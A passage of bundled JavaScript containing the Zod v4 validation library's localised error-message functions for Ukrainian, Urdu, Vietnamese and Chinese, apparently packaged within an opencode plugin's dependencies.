    base64: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64",
    base64url: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64url",
    json_string: "\u0440\u044F\u0434\u043E\u043A JSON",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${issue3.expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0430 \u043E\u043F\u0446\u0456\u044F: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F \u043E\u0434\u043D\u0435 \u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432"}`;
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} \u0431\u0443\u0434\u0435 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin} \u0431\u0443\u0434\u0435 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043F\u043E\u0447\u0438\u043D\u0430\u0442\u0438\u0441\u044F \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0437\u0430\u043A\u0456\u043D\u0447\u0443\u0432\u0430\u0442\u0438\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043C\u0456\u0441\u0442\u0438\u0442\u0438 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0432\u0456\u0434\u043F\u043E\u0432\u0456\u0434\u0430\u0442\u0438 \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0447\u0438\u0441\u043B\u043E: \u043F\u043E\u0432\u0438\u043D\u043D\u043E \u0431\u0443\u0442\u0438 \u043A\u0440\u0430\u0442\u043D\u0438\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u043E\u0437\u043F\u0456\u0437\u043D\u0430\u043D\u0438\u0439 \u043A\u043B\u044E\u0447${issue3.keys.length > 1 ? "\u0456" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u043A\u043B\u044E\u0447 \u0443 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456";
      case "invalid_element":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F \u0443 ${issue3.origin}`;
      default:
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456`;
    }
  };
};
function uk_default2() {
  return {
    localeError: error86()
  };
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ua.js
function ua_default2() {
  return uk_default2();
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ur.js
var error87 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0648\u0641", verb: "\u06C1\u0648\u0646\u0627" },
    file: { unit: "\u0628\u0627\u0626\u0679\u0633", verb: "\u06C1\u0648\u0646\u0627" },
    array: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" },
    set: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0646\u0645\u0628\u0631";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0622\u0631\u06D2";
        }
        if (data === null) {
          return "\u0646\u0644";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0627\u0646 \u067E\u0679",
    email: "\u0627\u06CC \u0645\u06CC\u0644 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    uuidv4: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 4",
    uuidv6: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 6",
    nanoid: "\u0646\u06CC\u0646\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    guid: "\u062C\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid2: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC 2",
    ulid: "\u06CC\u0648 \u0627\u06CC\u0644 \u0622\u0626\u06CC \u0688\u06CC",
    xid: "\u0627\u06CC\u06A9\u0633 \u0622\u0626\u06CC \u0688\u06CC",
    ksuid: "\u06A9\u06D2 \u0627\u06CC\u0633 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    datetime: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0688\u06CC\u0679 \u0679\u0627\u0626\u0645",
    date: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u062A\u0627\u0631\u06CC\u062E",
    time: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0648\u0642\u062A",
    duration: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0645\u062F\u062A",
    ipv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    ipv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    cidrv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0631\u06CC\u0646\u062C",
    cidrv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0631\u06CC\u0646\u062C",
    base64: "\u0628\u06CC\u0633 64 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    base64url: "\u0628\u06CC\u0633 64 \u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    json_string: "\u062C\u06D2 \u0627\u06CC\u0633 \u0627\u0648 \u0627\u06CC\u0646 \u0633\u0679\u0631\u0646\u06AF",
    e164: "\u0627\u06CC 164 \u0646\u0645\u0628\u0631",
    jwt: "\u062C\u06D2 \u0688\u0628\u0644\u06CC\u0648 \u0679\u06CC",
    template_literal: "\u0627\u0646 \u067E\u0679"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${issue3.expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${parsedType8(issue3.input)} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${stringifyPrimitive2(issue3.values[0])} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
        return `\u063A\u0644\u0637 \u0622\u067E\u0634\u0646: ${joinValues2(issue3.values, "|")} \u0645\u06CC\u06BA \u0633\u06D2 \u0627\u06CC\u06A9 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue3.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u06D2 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0627\u0635\u0631"} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue3.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u0627 ${adj}${issue3.maximum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue3.origin} \u06A9\u06D2 ${adj}${issue3.minimum.toString()} ${sizing.unit} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        }
        return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue3.origin} \u06A9\u0627 ${adj}${issue3.minimum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.prefix}" \u0633\u06D2 \u0634\u0631\u0648\u0639 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        }
        if (_issue.format === "ends_with")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.suffix}" \u067E\u0631 \u062E\u062A\u0645 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "includes")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.includes}" \u0634\u0627\u0645\u0644 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "regex")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: \u067E\u06CC\u0679\u0631\u0646 ${_issue.pattern} \u0633\u06D2 \u0645\u06CC\u0686 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        return `\u063A\u0644\u0637 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u063A\u0644\u0637 \u0646\u0645\u0628\u0631: ${issue3.divisor} \u06A9\u0627 \u0645\u0636\u0627\u0639\u0641 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
      case "unrecognized_keys":
        return `\u063A\u06CC\u0631 \u062A\u0633\u0644\u06CC\u0645 \u0634\u062F\u06C1 \u06A9\u06CC${issue3.keys.length > 1 ? "\u0632" : ""}: ${joinValues2(issue3.keys, "\u060C ")}`;
      case "invalid_key":
        return `${issue3.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u06A9\u06CC`;
      case "invalid_union":
        return "\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679";
      case "invalid_element":
        return `${issue3.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u0648\u06CC\u0644\u06CC\u0648`;
      default:
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679`;
    }
  };
};
function ur_default2() {
  return {
    localeError: error87()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/vi.js
var error88 = () => {
  const Sizable = {
    string: { unit: "k\xFD t\u1EF1", verb: "c\xF3" },
    file: { unit: "byte", verb: "c\xF3" },
    array: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" },
    set: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "s\u1ED1";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "m\u1EA3ng";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0111\u1EA7u v\xE0o",
    email: "\u0111\u1ECBa ch\u1EC9 email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ng\xE0y gi\u1EDD ISO",
    date: "ng\xE0y ISO",
    time: "gi\u1EDD ISO",
    duration: "kho\u1EA3ng th\u1EDDi gian ISO",
    ipv4: "\u0111\u1ECBa ch\u1EC9 IPv4",
    ipv6: "\u0111\u1ECBa ch\u1EC9 IPv6",
    cidrv4: "d\u1EA3i IPv4",
    cidrv6: "d\u1EA3i IPv6",
    base64: "chu\u1ED7i m\xE3 h\xF3a base64",
    base64url: "chu\u1ED7i m\xE3 h\xF3a base64url",
    json_string: "chu\u1ED7i JSON",
    e164: "s\u1ED1 E.164",
    jwt: "JWT",
    template_literal: "\u0111\u1EA7u v\xE0o"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${issue3.expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${stringifyPrimitive2(issue3.values[0])}`;
        return `T\xF9y ch\u1ECDn kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i m\u1ED9t trong c\xE1c gi\xE1 tr\u1ECB ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue3.origin ?? "gi\xE1 tr\u1ECB"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "ph\u1EA7n t\u1EED"}`;
        return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue3.origin ?? "gi\xE1 tr\u1ECB"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i b\u1EAFt \u0111\u1EA7u b\u1EB1ng "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i k\u1EBFt th\xFAc b\u1EB1ng "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i bao g\u1ED3m "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i kh\u1EDBp v\u1EDBi m\u1EABu ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} kh\xF4ng h\u1EE3p l\u1EC7`;
      }
      case "not_multiple_of":
        return `S\u1ED1 kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i l\xE0 b\u1ED9i s\u1ED1 c\u1EE7a ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kh\xF3a kh\xF4ng \u0111\u01B0\u1EE3c nh\u1EADn d\u1EA1ng: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kh\xF3a kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue3.origin}`;
      case "invalid_union":
        return "\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7";
      case "invalid_element":
        return `Gi\xE1 tr\u1ECB kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue3.origin}`;
      default:
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7`;
    }
  };
};
function vi_default2() {
  return {
    localeError: error88()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/zh-CN.js
var error89 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u7B26", verb: "\u5305\u542B" },
    file: { unit: "\u5B57\u8282", verb: "\u5305\u542B" },
    array: { unit: "\u9879", verb: "\u5305\u542B" },
    set: { unit: "\u9879", verb: "\u5305\u542B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u975E\u6570\u5B57(NaN)" : "\u6570\u5B57";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u6570\u7EC4";
        }
        if (data === null) {
          return "\u7A7A\u503C(null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u8F93\u5165",
    email: "\u7535\u5B50\u90AE\u4EF6",
    url: "URL",
    emoji: "\u8868\u60C5\u7B26\u53F7",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u671F\u65F6\u95F4",
    date: "ISO\u65E5\u671F",
    time: "ISO\u65F6\u95F4",
    duration: "ISO\u65F6\u957F",
    ipv4: "IPv4\u5730\u5740",
    ipv6: "IPv6\u5730\u5740",
    cidrv4: "IPv4\u7F51\u6BB5",
    cidrv6: "IPv6\u7F51\u6BB5",
    base64: "base64\u7F16\u7801\u5B57\u7B26\u4E32",
    base64url: "base64url\u7F16\u7801\u5B57\u7B26\u4E32",
    json_string: "JSON\u5B57\u7B26\u4E32",
    e164: "E.164\u53F7\u7801",
    jwt: "JWT",
    template_literal: "\u8F93\u5165"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${issue3.expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u65E0\u6548\u9009\u9879\uFF1A\u671F\u671B\u4EE5\u4E0B\u4E4B\u4E00 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue3.origin ?? "\u503C"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u4E2A\u5143\u7D20"}`;
        return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue3.origin ?? "\u503C"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.prefix}" \u5F00\u5934`;
        if (_issue.format === "ends_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.suffix}" \u7ED3\u5C3E`;
        if (_issue.format === "includes")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u6EE1\u8DB3\u6B63\u5219\u8868\u8FBE\u5F0F ${_issue.pattern}`;
        return `\u65E0\u6548${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u65E0\u6548\u6570\u5B57\uFF1A\u5FC5\u987B\u662F ${issue3.divisor} \u7684\u500D\u6570`;
      case "unrecognized_keys":
        return `\u51FA\u73B0\u672A\u77E5\u7684\u952E(key): ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} \u4E2D\u7684\u952E(key)\u65E0\u6548`;
      case "invalid_union":
        return "\u65E0\u6548\u8F93\u5165";
      case "invalid_element":
        return `${issue3.origin} \u4E2D\u5305\u542B\u65E0\u6548\u503C(value)`;
      default:
        return `\u65E0\u6548\u8F93\u5165`;
    }
  };
};
function zh_CN_default2() {
  return {
    localeError: error89()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/zh-TW.js
var error90 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u5143", verb: "\u64C1\u6709" },
    file: { unit: "\u4F4D\u5143\u7D44", verb: "\u64C1\u6709" },
    array: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" },
    set: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u8F38\u5165",
    email: "\u90F5\u4EF6\u5730\u5740",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u65E5\u671F\u6642\u9593",
    date: "ISO \u65E5\u671F",
    time: "ISO \u6642\u9593",
    duration: "ISO \u671F\u9593",
    ipv4: "IPv4 \u4F4D\u5740",
    ipv6: "IPv6 \u4F4D\u5740",
    cidrv4: "IPv4 \u7BC4\u570D",
    cidrv6: "IPv6 \u7BC4\u570D",
    base64: "base64 \u7DE8\u78BC\u5B57\u4E32",
    base64url: "base64url \u7DE8\u78BC\u5B57\u4E32",
    json_string: "JSON \u5B57\u4E32",
    e164: "E.164 \u6578\u503C",
    jwt: "JWT",
    template_literal: "\u8F38\u5165"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${issue3.expected}\uFF0C\u4F46\u6536\u5230 ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u7121\u6548\u7684\u9078\u9805\uFF1A\u9810\u671F\u70BA\u4EE5\u4E0B\u5176\u4E2D\u4E4B\u4E00 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue3.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u500B\u5143\u7D20"}`;
        return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue3.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue3.origin} \u61C9\u70BA ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue3.origin} \u61C9\u70BA ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.prefix}" \u958B\u982D`;
        }
        if (_issue.format === "ends_with")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.suffix}" \u7D50\u5C3E`;
        if (_issue.format === "includes")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u7B26\u5408\u683C\u5F0F ${_issue.pattern}`;
        return `\u7121\u6548\u7684 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
